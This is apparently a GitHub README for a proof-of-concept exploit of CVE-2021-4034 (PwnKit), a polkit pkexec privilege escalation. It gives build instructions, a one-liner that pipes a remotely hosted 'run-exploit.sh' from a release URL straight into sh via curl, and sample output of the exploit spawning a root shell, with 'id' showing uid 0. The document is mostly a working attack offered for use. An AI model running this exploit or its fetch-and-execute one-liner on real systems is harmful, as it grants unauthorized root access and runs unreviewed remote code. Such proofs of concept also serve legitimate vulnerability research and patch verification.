# poc-cve-2021-4034
PoC for CVE-2021-4034 dubbed pwnkit

[![Release](https://github.com/dzonerzy/poc-cve-2021-4034/actions/workflows/autorelease.yml/badge.svg)](https://github.com/dzonerzy/poc-cve-2021-4034/actions/workflows/autorelease.yml)


## How to use

just run make `make` then check release folder or if you prefer the one liner

`sh -c "$(curl -sSL https://github.com/dzonerzy/poc-cve-2021-4034/releases/download/v0.2/run-exploit.sh)"`

## Enjoy

```shell
dzonerzy@DESKTOP-5JHC90H:/mnt/c/Users/DZONERZY/GolangProjects/pkpwn$ ./exploit
Spawning root shell!
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1000(dzonerzy)
```
